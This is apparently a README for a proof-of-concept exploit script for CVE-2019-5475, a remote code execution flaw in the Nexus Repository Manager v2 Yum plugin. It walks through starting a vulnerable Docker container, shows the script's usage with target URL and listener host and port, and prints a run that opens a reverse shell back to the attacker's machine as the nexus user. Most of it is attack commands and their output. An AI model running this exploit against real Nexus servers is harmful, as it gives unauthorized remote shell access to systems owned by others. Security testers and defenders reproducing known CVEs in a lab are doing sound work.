# Nexus Repository Manager Remote Command Execution (CVE-2019-5475)

## Summary

The Nexus Yum Repository Plugin in v2 is vulnerable to Remote Code Execution when instances using CommandLineExecutor.java are supplied vulnerable data, such as the Yum Configuration Capability. 
We abuse this and spawn a reverse tcp shell.

## Usage

Start docker container if you don't want to test this exploit against the production server.

```sh
⬢  CVE-2019-5475_nexus_rce  master ⦿ docker-compose up -d
Creating network "cve-2019-5475_nexus_rce_default" with the default driver
Creating cve-2019-5475_nexus_rce_nexus_server_1 ... done
⬢  CVE-2019-5475_nexus_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                      COMMAND                  CREATED             STATUS              PORTS                    NAMES
d0ec7210abbc        sonatype/nexus:2.14.9-01   "/bin/sh -c '${JAVA_…"   5 seconds ago       Up 4 seconds        0.0.0.0:8081->8081/tcp   cve-2019-5475_nexus_rce_nexus_server_1
```

Run command without arguments for usage menu.

```sh
███▄▄▄▄      ▄████████ ▀████    ▐████▀ ███    █▄     ▄████████    ▄████████  ▄████████    ▄████████ 
███▀▀▀██▄   ███    ███   ███▌   ████▀  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
███   ███   ███    █▀     ███  ▐███    ███    ███   ███    █▀    ███    ███ ███    █▀    ███    █▀  
███   ███  ▄███▄▄▄        ▀███▄███▀    ███    ███   ███         ▄███▄▄▄▄██▀ ███         ▄███▄▄▄     
███   ███ ▀▀███▀▀▀        ████▀██▄     ███    ███ ▀███████████ ▀▀███▀▀▀▀▀   ███        ▀▀███▀▀▀     
███   ███   ███    █▄    ▐███  ▀███    ███    ███          ███ ▀███████████ ███    █▄    ███    █▄  
███   ███   ███    ███  ▄███     ███▄  ███    ███    ▄█    ███   ███    ███ ███    ███   ███    ███ 
 ▀█   █▀    ██████████ ████       ███▄ ████████▀   ▄████████▀    ███    ███ ████████▀    ██████████ 
[nighter@nighter.se]
    
Usage: ./nexus_rce.py <URL> <LHOST> <LPORT> [USERNAME] [PASSWORD]
EXAMPLE: ./nexus_rce.py 'http://127.0.0.1:8081' 10.10.14.24 4444
```

Run exploit and we get our shell.

```sh
⬢  CVE-2019-5475_nexus_rce  master ⦿ ./nexus_rce.py 'http://127.0.0.1:8081' 192.168.1.22 4444
[+] LHOST = 192.168.1.22
[+] Netcat = 4444
[+] Got ID: 0000289132e322f3
[+] Exploit
Connection from 172.23.0.2:52286
bash: no job control in this shell
[nexus@d0ec7210abbc nexus]$ id
uid=200(nexus) gid=200(nexus) groups=200(nexus)
```
